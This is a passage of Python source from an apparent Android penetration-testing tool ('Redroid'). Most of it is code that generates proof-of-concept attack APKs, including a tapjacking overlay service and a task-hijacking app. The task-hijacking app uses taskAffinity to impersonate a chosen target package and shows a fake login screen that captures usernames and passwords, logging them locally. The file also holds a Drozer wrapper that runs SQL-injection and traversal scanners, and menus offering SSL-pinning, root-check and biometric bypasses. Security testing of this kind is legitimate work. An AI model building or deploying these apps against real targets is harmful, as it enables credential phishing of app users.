                setupTapjackingView();
            }}
        }}, 1000);
    }}

    @SuppressLint("RtlHardcoded")
    private void setupTapjackingView() {{
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);

        int overlayType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }} else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        }} else {{
            // TYPE_SYSTEM_OVERLAY is less likely to trigger deprecation warnings on older versions
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        }}

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.LEFT;
        windowManager.addView(overlayView, params);

        Button btn = overlayView.findViewById(R.id.sampleButton);
        btn.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                stopSelf();
            }}
        }});
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (windowManager != null && overlayView != null) {{
            windowManager.removeView(overlayView);
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "OverlayService.java"), 'w') as f:
        f.write(overlay_service)

    # Find Android Studio's JDK
    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
    if not os.path.exists(android_studio_path):
        print("Error: Android Studio not found.")
        print("Please install Android Studio in the default location.")
        sys.exit(1)

    jbr_path = os.path.join(android_studio_path, "jbr")
    if not os.path.exists(jbr_path):
        print("Error: Android Studio JDK not found.")
        print("Please ensure Android Studio is properly installed.")
        sys.exit(1)

    os.environ['JAVA_HOME'] = jbr_path

    # Build APK using Android build tools
    print("Building APK...")
    
    # 1. Compile resources
    print("Compiling resources...")
    aapt = os.path.join(tools_path, "aapt.exe")
    if not os.path.exists(aapt):
        print("Error: aapt not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    subprocess.run([aapt, "package", "-f", "-m",
                   "-J", src_dir,
                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
                  check=True)

    # 2. Compile Java files
    print("Compiling Java files...")
    javac = os.path.join(jbr_path, "bin", "javac.exe")
    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
    
    # Create classes directory
    classes_dir = os.path.join(project_dir, "classes")
    ensure_directory_exists(classes_dir)

    subprocess.run([javac,
                   "-source", "1.8",
                   "-target", "1.8",
                   "-bootclasspath", android_jar,
                   "-d", classes_dir,
                   os.path.join(java_dir, "MainActivity.java"),
                   os.path.join(java_dir, "OverlayService.java"),
                   os.path.join(src_dir, "com", "tapjacking", "demo", "R.java")],
                  check=True)

    # 3. Create JAR file
    print("Creating JAR file...")
    jar = os.path.join(jbr_path, "bin", "jar.exe")
    classes_jar = os.path.join(project_dir, "classes.jar")
    
    # Change to classes directory to create jar with correct structure
    current_dir = os.getcwd()
    os.chdir(classes_dir)
    subprocess.run([jar, "cf", classes_jar, "com"],
                  check=True)
    os.chdir(current_dir)

    # 4. Convert JAR to DEX
    print("Converting to DEX format...")
    d8 = os.path.join(tools_path, "d8.bat")
    if not os.path.exists(d8):
        print("Error: d8 not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Create output directory
    dex_output_dir = os.path.join(project_dir, "dex-output")
    ensure_directory_exists(dex_output_dir)
    
    subprocess.run([d8,
                   "--lib", android_jar,
                   "--output", dex_output_dir,
                   classes_jar],
                  check=True)
    
    # Move the classes.dex file
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), 
                os.path.join(project_dir, "classes.dex"))

    # 5. Build APK using Android Build Tools
    print("Building APK...")
    output_apk = os.path.join(base_dir, "tapjacking.apk")
    
    # Use APK Builder directly from the command line
    zip_align = os.path.join(tools_path, "zipalign.exe")
    if not os.path.exists(zip_align):
        print("Warning: zipalign not found, APK will not be optimized.")
    
    # Create a minimal APK with just the necessary components
    subprocess.run([aapt, "package", "-f", "-M", 
                   os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", android_jar,
                   "--min-sdk-version", "24",
                   "--target-sdk-version", "28",
                   "-F", output_apk],
                  check=True)
    
    # Copy DEX file to current directory for easier adding
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
    
    # Add the DEX file
    subprocess.run([aapt, "add", output_apk, "classes.dex"],
                  check=True)
    
    # Clean up
    if os.path.exists("classes.dex"):
        os.remove("classes.dex")

    # APK is unsigned at this point
    print("APK generation complete (unsigned).")
    print(f"\nBuild successful! APK generated at: {output_apk}")
    
    return output_apk

def task_hijacking_apk_builder():
    """
    Fully automated APK generation for Task Hijacking PoC.
    Prompts for target app details and builds an unsigned APK.
    """
    global target_app
    
    # Check if target app is set, if not prompt to set it
    if not target_app:
        print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "❌ No target app selected. Aborting APK build." + Style.RESET_ALL)
            return
    
    target_package = target_app
    print(Fore.GREEN + f"Using target app: {target_package}" + Style.RESET_ALL)
    
    # Prompt for activity name
    target_activity = input("Enter the target activity name to hijack: ")
    
    # Validate inputs
    if not target_activity:
        print("Error: Activity name cannot be empty.")
        sys.exit(1)
    
    print(f"\nBuilding task hijacking APK targeting:")
    print(f"- Package: {target_package}")
    print(f"- Activity: {target_activity}")
    print("-" * 40)
    
    # Helper function
    def ensure_directory_exists(path):
        """Create directory if it doesn't exist"""
        if not os.path.exists(path):
            os.makedirs(path)

    # Setup paths
    base_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(base_dir, "Task-Hijacking-PoC")
    
    # Find Android SDK
    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
    if not os.path.exists(sdk_path):
        print("Error: Android SDK not found.")
        print("Please install Android Studio and the Android SDK.")
        sys.exit(1)

    # Find build tools
    build_tools_path = os.path.join(sdk_path, 'build-tools')
    if not os.path.exists(build_tools_path):
        print("Error: Android build tools not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Get latest build tools version
    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
    if not versions:
        print("Error: No build tools versions found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    latest_version = sorted(versions)[-1]
    tools_path = os.path.join(build_tools_path, latest_version)

    # Setup project structure
    print("Setting up project...")
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    
    # Create project directories
    src_dir = os.path.join(project_dir, "src")
    java_dir = os.path.join(src_dir, "com", "taskhijacking", "poc")
    res_dir = os.path.join(project_dir, "res")
    
    ensure_directory_exists(java_dir)
    ensure_directory_exists(os.path.join(res_dir, "layout"))
    ensure_directory_exists(os.path.join(res_dir, "values"))
    ensure_directory_exists(os.path.join(res_dir, "drawable"))
    
    # Write Android Manifest with taskAffinity targeting the victim app
    # This is key for the task hijacking attack
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.taskhijacking.poc">
    
    <application
        android:allowBackup="true"
        android:label="Task Hijacking PoC"
        android:theme="@android:style/Theme.Material.Light">
        
        <!-- Main entry point (launcher) -->
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Hijacking Activity that targets the specified app -->
        <activity android:name=".HijackingActivity"
            android:exported="true"
            android:taskAffinity="{target_package}"
            android:launchMode="singleTask"
            android:excludeFromRecents="true"
            android:theme="@android:style/Theme.Material.Light.NoActionBar">
            
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="http" />
                <data android:host="target-app" />
            </intent-filter>
            
            <!-- Additional intent filter to match target app's activity -->
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="package" android:host="{target_package}" />
            </intent-filter>
        </activity>
    </application>
</manifest>'''

    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest)

    # Write layout file for MainActivity
    main_layout = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Task Hijacking PoC"
        android:textSize="24sp"
        android:textStyle="bold"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="This app demonstrates task hijacking vulnerability. Click the button below to launch the attack."
        android:textSize="16sp"
        android:layout_marginBottom="24dp" />

    <Button
        android:id="@+id/btnLaunchAttack"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Launch Attack"
        android:layout_gravity="center" />

</LinearLayout>'''

    with open(os.path.join(res_dir, "layout", "activity_main.xml"), 'w') as f:
        f.write(main_layout)

    # Write layout file for Hijacking activity (fake login screen)
    hijack_layout = f'''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    android:gravity="center">

    <TextView
        android:id="@+id/tvTitle"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="{target_package}"
        android:textSize="24sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="32dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Please login to continue"
        android:textSize="18sp"
        android:gravity="center"
        android:layout_marginBottom="24dp" />

    <EditText
        android:id="@+id/etUsername"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Username"
        android:layout_marginBottom="8dp"
        android:inputType="text" />

    <EditText
        android:id="@+id/etPassword"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Password"
        android:layout_marginBottom="16dp"
        android:inputType="textPassword" />

    <Button
        android:id="@+id/btnLogin"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Login" />

    <TextView
        android:id="@+id/tvStatus"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="TASK HIJACKING POC - CREDENTIALS WILL BE CAPTURED"
        android:textColor="#FF0000"
        android:gravity="center"
        android:layout_marginTop="32dp"
        android:textStyle="bold"/>

</LinearLayout>'''

    with open(os.path.join(res_dir, "layout", "activity_hijacking.xml"), 'w') as f:
        f.write(hijack_layout)

    # Write strings.xml
    strings = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Task Hijacking PoC</string>
</resources>'''

    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write(strings)

    # Write MainActivity.java
    main_activity = f'''
package com.taskhijacking.poc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Button btnLaunchAttack = findViewById(R.id.btnLaunchAttack);
        btnLaunchAttack.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                launchAttack();
            }}
        }});
    }}
    
    private void launchAttack() {{
        try {{
            // Start our hijacking activity
            Intent intent = new Intent(this, HijackingActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // Show instruction to user
            Toast.makeText(this, "Attack launched! Return to recent apps and you'll see the malicious activity", 
                           Toast.LENGTH_LONG).show();
            
            // Try to launch the target app to see the attack in action
            Intent launchTarget = getPackageManager().getLaunchIntentForPackage("{target_package}");
            if (launchTarget != null) {{
                startActivity(launchTarget);
            }}
        }} catch (Exception e) {{
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity)

    # Write HijackingActivity.java
    hijacking_activity = f'''
package com.taskhijacking.poc;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class HijackingActivity extends Activity {{
    private static final String TAG = "TaskHijacking";
    private EditText etUsername;
    private EditText etPassword;
    private TextView tvStatus;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hijacking);
        
        etUsername = findViewById(R.id.etUsername);
        etPassword = findViewById(R.id.etPassword);
        tvStatus = findViewById(R.id.tvStatus);
        
        Button btnLogin = findViewById(R.id.btnLogin);
        btnLogin.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                captureCredentials();
            }}
        }});
        
        // Set the target package name as the title
        TextView tvTitle = findViewById(R.id.tvTitle);
        tvTitle.setText("{target_package}");
        
        // Log the task hijacking attempt
        Log.i(TAG, "Task hijacking attempt against package: {target_package}");
        Log.i(TAG, "Target activity: {target_activity}");
    }}
    
    private void captureCredentials() {{
        String username = etUsername.getText().toString();
        String password = etPassword.getText().toString();
        
        if (username.isEmpty() || password.isEmpty()) {{
            Toast.makeText(this, "Please enter both username and password", Toast.LENGTH_SHORT).show();
            return;
        }}
        
        // In a real attack, credentials would be sent to an attacker's server
        // For this PoC, we just log them locally
        Log.i(TAG, "Captured credentials - Username: " + username);
        Log.i(TAG, "Captured credentials - Password: " + password);
        
        tvStatus.setText("Credentials captured! Username: " + username);
        
        // Notify user this is a PoC
        Toast.makeText(this, "Task hijacking successful! Credentials captured.", Toast.LENGTH_LONG).show();
        
        // In a real attack, the malicious app might now redirect to the legitimate app
        // to avoid suspicion
    }}
    
    @Override
    protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        Log.i(TAG, "onNewIntent: " + intent.toString());
        // Received a new intent, which could be from returning to this task
    }}
}}'''

    with open(os.path.join(java_dir, "HijackingActivity.java"), 'w') as f:
        f.write(hijacking_activity)

    # Find Android Studio's JDK
    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
    if not os.path.exists(android_studio_path):
        print("Error: Android Studio not found.")
        print("Please install Android Studio in the default location.")
        sys.exit(1)

    jbr_path = os.path.join(android_studio_path, "jbr")
    if not os.path.exists(jbr_path):
        print("Error: Android Studio JDK not found.")
        print("Please ensure Android Studio is properly installed.")
        sys.exit(1)

    os.environ['JAVA_HOME'] = jbr_path

    # Build APK using Android build tools
    print("Building APK...")
    
    # 1. Compile resources
    print("Compiling resources...")
    aapt = os.path.join(tools_path, "aapt.exe")
    if not os.path.exists(aapt):
        print("Error: aapt not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    subprocess.run([aapt, "package", "-f", "-m",
                   "-J", src_dir,
                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
                  check=True)

    # 2. Compile Java files
    print("Compiling Java files...")
    javac = os.path.join(jbr_path, "bin", "javac.exe")
    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
    
    # Create classes directory
    classes_dir = os.path.join(project_dir, "classes")
    ensure_directory_exists(classes_dir)

    subprocess.run([javac,
                   "-source", "1.8",
                   "-target", "1.8",
                   "-bootclasspath", android_jar,
                   "-d", classes_dir,
                   os.path.join(java_dir, "MainActivity.java"),
                   os.path.join(java_dir, "HijackingActivity.java"),
                   os.path.join(src_dir, "com", "taskhijacking", "poc", "R.java")],
                  check=True)

    # 3. Create JAR file
    print("Creating JAR file...")
    jar = os.path.join(jbr_path, "bin", "jar.exe")
    classes_jar = os.path.join(project_dir, "classes.jar")
    
    # Change to classes directory to create jar with correct structure
    current_dir = os.getcwd()
    os.chdir(classes_dir)
    subprocess.run([jar, "cf", classes_jar, "com"],
                  check=True)
    os.chdir(current_dir)

    # 4. Convert JAR to DEX
    print("Converting to DEX format...")
    d8 = os.path.join(tools_path, "d8.bat")
    if not os.path.exists(d8):
        print("Error: d8 not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Create output directory
    dex_output_dir = os.path.join(project_dir, "dex-output")
    ensure_directory_exists(dex_output_dir)
    
    subprocess.run([d8,
                   "--lib", android_jar,
                   "--output", dex_output_dir,
                   classes_jar],
                  check=True)

    # 5. Build APK using Android Build Tools
    print("Building APK...")
    output_apk = os.path.join(base_dir, "task_hijacking.apk")
    
    # Create a minimal APK with just the necessary components
    subprocess.run([aapt, "package", "-f", "-M", 
                   os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", android_jar,
                   "--min-sdk-version", "24",
                   "--target-sdk-version", "28",
                   "-F", output_apk],
                  check=True)
    
    # Copy DEX file to current directory for easier adding
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
    
    # Add the DEX file to APK
    subprocess.run([aapt, "add", output_apk, "classes.dex"],
                  check=True)
    
    # Clean up
    if os.path.exists("classes.dex"):
        os.remove("classes.dex")

    # APK is unsigned at this point
    print("APK generation complete (unsigned).")
    print(f"\nBuild successful! APK generated at: {output_apk}")
    
    return output_apk

def drozer_vulnscan():
    global target_app
    # Inizializzazione variabili per report HTML e separatore
    html_begin = "<html><head><title>APP Analysis Report</title></head><body><h1 style=\"text-align: center;\"><strong>Drozer Analysis Report</strong></h1>"
    separator = "_" * 100 + "\n"
    
    # Check if target app is set, if not prompt to set it
    if not target_app:
        print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "❌ No target app selected. Aborting scan." + Style.RESET_ALL)
            return
    
    p_name = target_app
    print(Fore.GREEN + f"Using target app: {p_name}" + Style.RESET_ALL)
    
    # Richiesta di input all'utente per il nome del file
    file_name = input("Enter the file name to store the results: ")
    f_json = file_name + ".json"
    f_html = file_name + ".html"
    
    # Funzione per eseguire il comando drozer e restituire l'output
    def perform_scan(query_type, p_name, a=0):
        drozer_command = 'drozer console connect -c "run ' + str(query_type) + ' ' + str(p_name) + '"'
        if a == 1:
            drozer_command = 'drozer console connect -c "run ' + str(query_type) + ' "'
        process = subprocess.Popen(drozer_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   shell=True, universal_newlines=True)
        input_stream, output_stream = process.stdin, process.stdout
        process_data = output_stream.read()
        input_stream.close()
        output_stream.close()
        process.wait()
        if process_data.find("could not find the package") != -1:
            process_data = 'Invalid Package'
        return process_data

    # Funzione per formattare i dati e salvare i risultati in file JSON e HTML
    def format_data(task, result, file_name):
        nonlocal html_begin
        html_out = 1
        sep = "*" * 50
        print(Fore.GREEN + "\n%s:\n%s\n%s" % (task, sep, result))
        result_html = result.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") \
                            .replace("\\n", "<br>").replace("\\r", "")
        final_res = {str(task): result_html}
        with open(file_name, "a") as outfile:
            json.dump(final_res, outfile)
        if html_out:
            html_begin += (
                "<table style=\"border-style: solid; width: 100%; margin-left: auto; margin-right: auto;\" border=\"1\" width=\"100%\">"
                "<tbody><tr style=\"background: #12294d; color: #ffffff; text-align: left;\"><td>" + task +
                "</td></tr><tr><td style=\"text-align: left;\"><pre style=\"line-height: 0.8em;\"><span>" +
                result_html +
                "</span></pre></td></tr></tbody></table><br><br>"
            )
    
    print(Fore.BLUE + separator)
    
    # Esecuzione delle scansioni con drozer e formattazione dei risultati
    package_info = perform_scan('app.package.info -a', p_name)
    format_data("Package Information", package_info, f_json)
    print(separator)
    
    activity_info = perform_scan('app.activity.info -i -u -a', p_name)
    format_data("Activities Information", activity_info, f_json)
    print(separator)
    
    broadcast_info = perform_scan('app.broadcast.info -i -u -a', p_name)
    format_data("Broadcast Receivers Information", broadcast_info, f_json)
    print(separator)
    
    attacksurface_info = perform_scan('app.package.attacksurface', p_name)
    format_data("Attack Surface Information", attacksurface_info, f_json)
    print(separator)
    
    backupapi_info = perform_scan('app.package.backup -f', p_name)
    format_data("Package with Backup API Information", backupapi_info, f_json)
    print(separator)
    
    manifest_info = perform_scan('app.package.manifest', p_name)
    format_data("Android Manifest File", manifest_info, f_json)
    print(separator)
    
    nativelib_info = perform_scan('app.package.native', p_name)
    format_data("Native Libraries used", nativelib_info, f_json)
    print(separator)
    
    contentprovider_info = perform_scan('app.provider.info -u -a', p_name)
    format_data("Content Provider Information", contentprovider_info, f_json)
    print(separator)
    
    finduri_info = perform_scan('app.provider.finduri', p_name)
    format_data("Content Provider URIs", finduri_info, f_json)
    print(separator)
    
    services_info = perform_scan('app.service.info -i -u -a', p_name)
    format_data("Services Information", services_info, f_json)
    print(separator)
    
    nativecomponents_info = perform_scan('scanner.misc.native -a', p_name)
    format_data("Native Components in Package", nativecomponents_info, f_json)
    print(separator)
    
    worldreadable_info = perform_scan('scanner.misc.readablefiles /data/data/' + p_name + '/', p_name, 1)
    format_data("World Readable Files in App Installation Location", worldreadable_info, f_json)
    print(separator)
    
    worldwriteable_info = perform_scan('scanner.misc.readablefiles /data/data/' + p_name + '/', p_name, 1)
    format_data("World Writeable Files in App Installation Location", worldwriteable_info, f_json)
    print(separator)
    
    querycp_info = perform_scan('scanner.provider.finduris -a', p_name)
    format_data("Content Providers Query from Current Context", querycp_info, f_json)
    print(separator)
    
    sqli_info = perform_scan('scanner.provider.injection -a', p_name)
    format_data("SQL Injection on Content Providers", sqli_info, f_json)
    print(separator)
    
    sqltables_info = perform_scan('scanner.provider.sqltables -a', p_name)
    format_data("SQL Tables using SQL Injection", sqltables_info, f_json)
    print(separator)
    
    dirtraversal_info = perform_scan('scanner.provider.traversal -a', p_name)
    format_data("Directory Traversal using Content Provider", dirtraversal_info, f_json)
    print(separator)
    
    # Completa il report HTML e lo salva su file
    html_begin += "</body></html>"
    with open(f_html, "wb") as f:
        f.write(html_begin.encode("utf-8"))
    
    print("\nAll the results are stored in " + file_name + " (JSON, TXT, and HTML files).")
    print(separator)

def show_exploits_menu():
    print("\n" + "=" * 50)
    print(f"{'Exploits':^50}")
    print("=" * 50)
    print("1. 🔍  Tapjacking")
    print("2. 🔒  Task Hijacking")
    print("3. ↩️  Back")

def exploits_menu_loop():
    while True:
        show_exploits_menu()
        choice = input(Fore.CYAN + "📌 Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '1':
            tapjacking_apk_builder()
        elif choice == '2':
            task_hijacking_apk_builder()
        elif choice == '3':
            break
        else:
            print(Fore.RED + "❗ Invalid choice, please try again." + Style.RESET_ALL)

def show_api_keys_testing_menu():
    print("\n" + "=" * 50)
    print(f"{'APK Keys Testing':^50}")
    print("=" * 50)
    print("1. 🔑  Google Maps API")
    print("2. ↩️  Back")

def api_keys_testing_menu_loop():
    while True:
        show_api_keys_testing_menu()
        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '1':
            apikey = input("Please enter the Google Maps API key to test: ").strip()
            if apikey:
                scan_gmaps(apikey)
            else:
                print("Invalid API key. Please try again.")
        elif choice == '2':
            break
        else:
            print("Invalid choice, please try again.")

def show_drozer_menu():
    print("\n" + "=" * 50)
    print(f"{'Drozer':^50}")
    print("=" * 50)
    print("1. 🏹  Install Drozer Agent")
    print("2. 🚀  Forward Port Locally (31415)")
    print("3. 🐞  Perform Vulnearbility Scan")
    print("4. ↩️  Back")

def drozer_menu_loop():
    while True:
        show_drozer_menu()
        choice = input(Fore.CYAN + "📌 Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '1':
            install_drozer_agent()
        elif choice == '2':
            start_drozer_forwarding()
        elif choice == '3':
            drozer_vulnscan()
        elif choice == '4':
            break
        else:
            print(Fore.RED + "❗ Invalid choice, please try again." + Style.RESET_ALL)

def show_run_tools_menu():
    print("\n" + "=" * 50)
    print(f"{'Run Tools':^50}")
    print("=" * 50)
    print("1. 🛡️  Run MobSF (docker)")
    print("2. 🔍  Run nuclei against APK")
    print("3. 🕵️  Run apkleaks against APK")
    print("4. 🚀  Run Android Studio Emulator")
    print("5. ↩️  Back")

def show_emulator_options_menu():
    print("\n" + "=" * 50)
    print(f"{'Emulator Options':^50}")
    print("=" * 50)
    print("1. 🧹  Remove Ads and Bloatware from Nox Emulator")
    print("2. 🛡️  Install Burp Certificate")
    print("3. 💻  Open ADB shell")
    print("4. 🌐  Print proxy status")
    print("5. ⚙️  Set up/modify proxy")
    print("6. ❌  Remove proxy")
    print("7. ↩️  Back")


def show_frida_menu():
    print("\n" + "=" * 50)
    print(f"{'Frida':^50}")
    print("=" * 50)
    print("1. 🧩  Install Frida Server")
    print("2. ▶️  Run Frida Server")
    print("3. 📜  List installed applications")
    print("4. 🧠  Dump memory of an application")
    print("5. 🔓  Run SSL Pinning Bypass")
    print("6. 🛡️  Run Root Check Bypass")
    print("7. 🔑  Android Biometric Bypass")
    print("8. 📝  Run Custom Script")
    print("9. ↩️  Back")

def show_main_menu():
    print(Fore.CYAN + r"""
    __________       ________               .__    .___
    \______   \ ____ \______ \_______  ____ |__| __| _/
     |       _// __ \ |    |  \_  __ \/  _ \|  |/ __ | 
     |    |   \  ___/ |       \  | \(  <_> )  / /_/ | 
     |____|_  /\___  >_______  /__|   \____/|__\____ | 
            \/     \/        \/                     \/ 
    """ + Style.RESET_ALL)
    print(Fore.GREEN + "Welcome to the Redroid Tool!" + Style.RESET_ALL)
    print("=" * 50)
    print("1. 🎯  Set Target")
    print("2. 🚀  Run Tools")
    print("3. 🎮  Emulator Options")
    print("4. 🕵️  Frida")
    print("5. 🏹  Drozer")
    print("6. 💥  Exploits")
    print("7. 🔑  API Keys Testing")
    print("8. ❌  Exit")

def main():
    global emulator_type, emulator_installation_path, adb_command, device_serial, target_app

    emulator_type, emulator_installation_path = detect_emulator()
    if emulator_type:
        print(Fore.GREEN + f"✅ Emulator detected: {emulator_type}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "⚠️ Emulator not detected or running on Android." + Style.RESET_ALL)

    adb_command = get_adb_command(emulator_type, emulator_installation_path)

    if emulator_type == 'Nox' and adb_command:
        connect_nox_adb_ports(adb_command)

    devices = get_connected_devices(adb_command)
    if not devices:
        print(Fore.YELLOW + "⚠️ No devices connected via adb." + Style.RESET_ALL)
        device_serial = None
    elif len(devices) == 1:
        device_serial = devices[0]
        print(Fore.GREEN + f"✅ Device connected: {device_serial}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "⚠️ Multiple devices connected:" + Style.RESET_ALL)
        for idx, dev in enumerate(devices, 1):
            print(f"{idx}. {dev}")
        choice = input("🔢 Select a device by number: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(devices):
            device_serial = devices[int(choice) - 1]
            print(Fore.GREEN + f"✅ Device selected: {device_serial}" + Style.RESET_ALL)
        else:
            print(Fore.RED + "❌ Invalid choice. No device selected." + Style.RESET_ALL)
            device_serial = None

    while True:
        show_main_menu()
        main_choice = input(Fore.CYAN + "📌 Enter your choice: " + Style.RESET_ALL).strip()
        if main_choice == '1':
            set_target_app()
        elif main_choice == '2':
            while True:
                show_run_tools_menu()
                run_tools_choice = input(Fore.CYAN + "📌 Enter your choice: " + Style.RESET_ALL).strip()
                if run_tools_choice == '1':
                    run_mobsf()
                elif run_tools_choice == '2':
                    run_nuclei_against_apk()
                elif run_tools_choice == '3':
                    run_apkleaks()
                elif run_tools_choice == '4':
                    run_android_studio_emulator()
                elif run_tools_choice == '5':
                    break
                else:
                    print(Fore.RED + "❗ Invalid choice, please try again." + Style.RESET_ALL)
        elif main_choice == '3':
            while True:
                show_emulator_options_menu()
                emulator_choice = input(Fore.CYAN + "🕹️ Enter your choice: " + Style.RESET_ALL).strip()
                if emulator_choice == '1':
                    print(Fore.YELLOW + "Remove Ads and Bloatware functionality not implemented." + Style.RESET_ALL)
                elif emulator_choice == '2':
                    port = input(Fore.CYAN + "📝 Enter the Burp Suite port: " + Style.RESET_ALL).strip()
                    if port.isdigit():
                        install_burpsuite_certificate(int(port))
                    else:
                        print(Fore.RED + "❌ Invalid port. Enter a valid port number." + Style.RESET_ALL)
                elif emulator_choice == '3':
                    if adb_command and device_serial:
                        subprocess.run(f'{adb_command} -s {device_serial} shell', shell=True)
                    else:
                        print(Fore.RED + "❌ ADB shell not available (no device selected or on Android)." + Style.RESET_ALL)
                elif emulator_choice == '4':
                    result = run_adb_command('shell settings get global http_proxy')
                    if result and result.stdout.strip():
                        print(Fore.CYAN + "🌐 Current proxy: " + Fore.GREEN + result.stdout.strip() + Style.RESET_ALL)
                    else:
                        print(Fore.YELLOW + "⚠️ No proxy is currently set." + Style.RESET_ALL)
                elif emulator_choice == '5':
                    ipv4_addresses = get_local_ipv4_addresses()
                    print("\n" + "{:<30} {:<15}".format("Interface", "IP Address"))
                    print("-" * 45)
                    for iface, ip in ipv4_addresses.items():
